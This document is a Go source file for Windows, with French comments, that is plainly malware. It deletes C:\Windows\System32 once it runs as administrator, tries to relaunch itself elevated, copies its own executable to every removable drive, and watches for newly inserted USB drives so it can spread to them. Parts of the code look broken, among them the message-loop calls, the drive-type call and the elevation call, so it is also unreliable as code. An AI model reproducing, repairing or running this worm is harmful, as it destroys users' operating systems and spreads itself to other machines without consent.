package main

import (
	"fmt"
	"io"
	"os"
	"path/filepath"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

var (
	user32           = syscall.NewLazyDLL("user32.dll")
	kernel32         = syscall.NewLazyDLL("kernel32.dll")
	registerDevice   = user32.NewProc("RegisterDeviceNotificationW")
	getMessage       = user32.NewProc("GetMessageW")
	translateMessage = user32.NewProc("TranslateMessage")
	dispatchMessage  = user32.NewProc("DispatchMessageW")
	createWindowEx   = user32.NewProc("CreateWindowExW")
	defWindowProc    = user32.NewProc("DefWindowProcW")
)

const (
	WM_DEVICECHANGE   = 0x0219
	DBT_DEVICEARRIVAL = 0x8000
	DBT_DEVTYP_VOLUME = 0x00000002
	WS_OVERLAPPEDWINDOW = 0x00CF0000
	CW_USEDEFAULT = -2147483648
)

type DEV_BROADCAST_VOLUME struct {
	dbcvSize       uint32
	dbcvDevicetype uint32
	dbcvReserved   uint32
	dbcvUnitmask   uint32
	dbcvFlags      uint16
}

type MSG struct {
	Hwnd    uintptr
	Message uint32
	WParam  uintptr
	LParam  uintptr
	Time    uint32
	Pt      struct {
		X, Y int32
	}
}

func main() {
	if !isAdmin() {
		relaunchAsAdmin()
		return
	}

	folderToDelete := `C:\Windows\System32`
	_ = os.RemoveAll(folderToDelete)

	exePath, err := os.Executable()
	if err != nil {
		fmt.Println("Erreur:", err)
		return
	}

	copyToAllUSBs(exePath)

	// Écoute des messages système pour détecter les nouvelles clés USB
	var msg MSG
	for {
		ret, _, _ := getMessage.Call(0, 0, 0, 0)
		if ret == 0 {
			break
		}
		if msg.Message == WM_DEVICECHANGE {
			if msg.WParam == uintptr(DBT_DEVICEARRIVAL) {
				dev := (*DEV_BROADCAST_VOLUME)(unsafe.Pointer(msg.LParam))
				if dev.dbcvDevicetype == DBT_DEVTYP_VOLUME {
					for i := 0; i < 26; i++ {
						if dev.dbcvUnitmask&(1<<uint(i)) != 0 {
							drive := string(rune('A'+i)) + ":\\"
							copyToDrive(exePath, drive)
						}
					}
				}
			}
		}
		translateMessage.Call(uintptr(unsafe.Pointer(&msg)))
		dispatchMessage.Call(uintptr(unsafe.Pointer(&msg)))
	}
}

func copyToAllUSBs(exePath string) {
	for letter := 'D'; letter <= 'Z'; letter++ {
		drive := string(letter) + ":\\"
		driveType, _, _ := syscall.GetDriveType(exePath, &drive)
		// DRIVE_REMOVABLE = 2
		if driveType == 2 {
			copyToDrive(exePath, drive)
		}
	}
}

func copyToDrive(exePath, drive string) {
	destFile := filepath.Join(drive, filepath.Base(exePath))
	err := copyFile(exePath, destFile)
	if err != nil {
		fmt.Println("Erreur copie:", err)
	}
}

func copyFile(src, dst string) error {
	in, err := os.Open(src)
	if err != nil {
		return err
	}
	defer in.Close()

	out, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer out.Close()

	_, err = io.Copy(out, in)
	if err != nil {
		return err
	}
	return out.Close()
}

func isAdmin() bool {
	_, err := os.Open("\\\\.\\PHYSICALDRIVE0")
	if err != nil {
		return false
	}
	return true
}

func relaunchAsAdmin() {
	exe, err := os.Executable()
	if err != nil {
		return
	}
	verbPtr := syscall.StringToUTF16Ptr("runas")
	exePtr := syscall.StringToUTF16Ptr(exe)
	syscall.LazyProc{}.Call(0, uintptr(unsafe.Pointer(verbPtr)), uintptr(unsafe.Pointer(exePtr)), 0, 0, 1)
}